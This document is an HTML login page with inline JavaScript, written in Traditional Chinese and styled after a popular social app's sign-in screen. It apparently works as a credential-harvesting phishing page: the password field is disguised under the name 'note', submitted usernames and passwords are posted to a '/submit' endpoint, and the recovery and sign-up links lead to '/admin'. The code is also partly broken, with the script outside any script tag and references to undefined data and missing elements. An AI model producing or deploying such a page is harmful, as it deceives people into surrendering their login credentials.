<body>
  <main class="screen">
    <section class="phone">
      <div class="locale-switcher">
        <button class="locale-button" id="locale-button" type="button" aria-haspopup="true" aria-expanded="false">
          <span id="locale-label">中文(台灣)</span>
          <span class="locale-caret" aria-hidden="true">▾</span>
        </button>
        <div class="locale-menu" id="locale-menu" hidden></div>
      </div>

      <div class="brand" aria-hidden="true">
        <img class="brand-image" src="brand-logo.png" alt="Brand logo" />
      </div>

      <form class="card" id="client-form">
        <label class="field">
          <input id="account-input" name="account" type="text" placeholder="用戶名稱、電子郵件地址或手機號碼" autocomplete="username" required />
        </label>

        <label class="field">
          <input id="note-input" name="note" type="text" placeholder="密碼" autocomplete="off" />
        </label>

        <button class="primary-btn" id="submit-btn" type="submit">登入</button>

        <a class="backlink" id="admin-link" href="/admin">忘記密碼？</a>
        <p class="status" id="status" aria-live="polite"></p>
      </form>

      <button class="secondary-btn" id="secondary-btn" type="button">建立新帳號</button>

      <img class="footer-mark" src="footer-mark.png" alt="Brand mark" />
    </section>

    const form = document.getElementById('client-form');
    const status = document.getElementById('status');
    const localeButton = document.getElementById('locale-button');
    const localeLabel = document.getElementById('locale-label');
    const localeMenu = document.getElementById('locale-menu');
    const accountLabel = document.getElementById('account-label');
    const noteLabel = document.getElementById('note-label');
    const accountInput = document.getElementById('account-input');
    const noteInput = document.getElementById('note-input');
    const submitBtn = document.getElementById('submit-btn');
    const secondaryBtn = document.getElementById('secondary-btn');
    const adminLink = document.getElementById('admin-link');
    const STORAGE_KEY = 'preferred-language';
    let currentLanguageId = 'zh-TW';
    let lastOutcome = '';

    function escapeHtml(value) {
      return String(value)
        .replaceAll('&', '&amp;')
        .replaceAll('<', '&lt;')
        .replaceAll('>', '&gt;')
        .replaceAll('"', '&quot;')
        .replaceAll("'", '&#39;');
    }

    function getLanguage(id) {
      return languages.find((entry) => entry.id === id) || languages[0];
    }

    function setMenuOpen(isOpen) {
      localeMenu.hidden = !isOpen;
      localeButton.setAttribute('aria-expanded', String(isOpen));
    }

    function renderLanguageMenu() {
      localeMenu.innerHTML = languages
        .map((entry) => `
          <button type="button" class="locale-option" data-language="${entry.id}" aria-selected="${entry.id === currentLanguageId}">
            <span>${escapeHtml(entry.label)}</span>
          </button>
        `)
        .join('');
    }

    function applyLanguage(id, persist = true) {
      const language = getLanguage(id);
      currentLanguageId = language.id;

      if (persist) {
        try {
          localStorage.setItem(STORAGE_KEY, language.id);
        } catch {}
      }

      document.documentElement.lang = language.htmlLang;
      if (language.dir) {
        document.documentElement.dir = language.dir;
      } else {
        document.documentElement.removeAttribute('dir');
      }

      document.title = language.title;
      localeLabel.textContent = language.label;
      accountLabel.textContent = language.accountLabel;
      noteLabel.textContent = language.noteLabel;
      accountInput.placeholder = language.accountPlaceholder;
      noteInput.placeholder = language.notePlaceholder;
      submitBtn.textContent = language.submit;
      secondaryBtn.textContent = language.secondary;
      adminLink.textContent = language.admin;
      renderLanguageMenu();

      if (lastOutcome === 'success') {
        status.textContent = language.success;
      } else if (lastOutcome === 'error') {
        status.textContent = language.error;
      }
    }

    localeButton.addEventListener('click', (event) => {
      event.stopPropagation();
      const shouldOpen = localeMenu.hidden;
      renderLanguageMenu();
      setMenuOpen(shouldOpen);
    });

    localeMenu.addEventListener('click', (event) => {
      const button = event.target.closest('[data-language]');
      if (!button) return;
      applyLanguage(button.dataset.language);
      setMenuOpen(false);
    });

    document.addEventListener('click', () => setMenuOpen(false));
    document.addEventListener('keydown', (event) => {
      if (event.key === 'Escape') setMenuOpen(false);
    });

    secondaryBtn.addEventListener('click', () => {
      window.location.href = '/admin';
    });

    form.addEventListener('submit', async (event) => {
      event.preventDefault();

      const data = new FormData(form);
      const payload = {
        account: String(data.get('account') || '').trim(),
        note: String(data.get('note') || '').trim(),
        source: '網站表單'
      };

      const response = await fetch('/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (response.ok) {
        lastOutcome = 'success';
        status.textContent = getLanguage(currentLanguageId).success;
        form.reset();
      } else {
        lastOutcome = 'error';
        status.textContent = getLanguage(currentLanguageId).error;
      }
    });

    try {
      const savedLanguage = localStorage.getItem(STORAGE_KEY);
      applyLanguage(savedLanguage || 'zh-TW', false);
    } catch {
      applyLanguage('zh-TW', false);
    }
